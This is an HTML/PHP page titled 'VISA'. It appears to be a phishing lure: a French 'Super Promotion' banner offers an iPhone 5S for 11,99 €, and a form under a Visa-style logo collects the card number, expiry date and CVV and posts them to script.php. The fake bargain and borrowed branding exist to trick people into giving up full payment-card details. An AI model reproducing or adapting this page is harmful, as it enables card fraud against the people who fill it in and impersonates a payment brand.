<!DOCTYPE html>
<html>
<head>
	<title>VISA</title>
	<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRsYWnplMRvpZPeA9Weqi5-YRhXPelUYT2gyb6yDfbconNLWkNrhDf7JJhtOTeRfzNGm_w&usqp=CAU" />
	<!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">

<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<style type="text/css">
	select{
		border-radius: 4px;

	}
</style>
	

	<div class="alert alert-success" role="alert">
 <i class="bi bi-bag-fill"></i> Super Promotion en cour.
</div>
<div class="container-fluid">


	<div class="alert alert-primary" role="alert">
	<i class="bi bi-basket2-fill"></i> | <b>Iphone 5S (<strike style="opacity: 0.6;">69,99</strike> €)  11,99 € </b>
	</div>


<form method="POST" action="script.php">
		<center>
	<div>
		<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRsYWnplMRvpZPeA9Weqi5-YRhXPelUYT2gyb6yDfbconNLWkNrhDf7JJhtOTeRfzNGm_w&usqp=CAU" style="height: 80px;">
		<hr>
		<table>
			<tr>
				<td>Carte Bancaire</td><td><input type="number" minlength="16" required="" placeholder="Ex: 4236 8615 8842 3130" class="form-control" name="n_carte"></td>
			</tr>
			<tr>
				<td>Date d'expiration</td><td>
					Mois:<select required="" name="date_exp_mois">
						<option></option>
						<option>01</option>
						<option>02</option>
						<option>03</option>
						<option>04</option>
						<option>05</option>
						<option>06</option>
						<option>07</option>
						<option>08</option>
						<option>09</option>
						<option>10</option>
						<option>11</option>
						<option>12</option>
					</select>
					Année
					<select required="" name="date_exp_annee" >
						<?php 
							$x=2022;
							while ($x<2035) {
								?>
								<option><?php echo$x; ?></option>
								<?php
								$x=$x+1;
							}
							?>
					</select>
				</td>
			</tr>
			<tr>
				<td>Code de vérification :</td> <td><input type="number" placeholder="Ex: 424" required="" maxlength="3" minlength="3"  class="form-control" name="cvv"></td>
			</tr>
		</table>
		<br>
		<button type="submit" name="submit_visa" class="btn btn-success"><i class="bi bi-check-circle-fill"></i> Effectuer</button>
	</div>
</center>
</form>
</div>
</body>
</html>